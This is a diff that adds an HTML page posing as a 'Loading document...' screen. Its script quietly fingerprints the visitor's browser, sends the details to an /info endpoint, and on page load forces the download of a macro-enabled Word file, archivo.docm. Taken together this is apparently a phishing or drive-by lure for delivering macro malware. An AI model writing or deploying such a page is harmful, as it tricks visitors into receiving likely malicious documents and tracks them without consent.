@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading document...</title>
+</head>
+<body>
+    <h3>Loading document...</h3>
+
+    <script>
+        // Collect basic browser information
+        const datos = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: {
+                width: screen.width,
+                height: screen.height
+            }
+        };
+        
+        navigator.sendBeacon("/info", JSON.stringify(datos));
+
+        // // Send data to /info endpoint
+        // fetch("/info", {
+        //     method: "POST",
+        //     headers: {
+        //         "Content-Type": "application/json"
+        //     },
+        //     body: JSON.stringify(datos)
+        // });
+
+        navigator.sendBeacon("/info", JSON.stringify(datos));
+
+        // Trigger automatic download of archivo.docm
+        window.onload = () => {
+            const link = document.createElement("a");
+            link.href = "/archivo.docm";
+            link.download = "archivo.docm";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
+</body>
+</html>
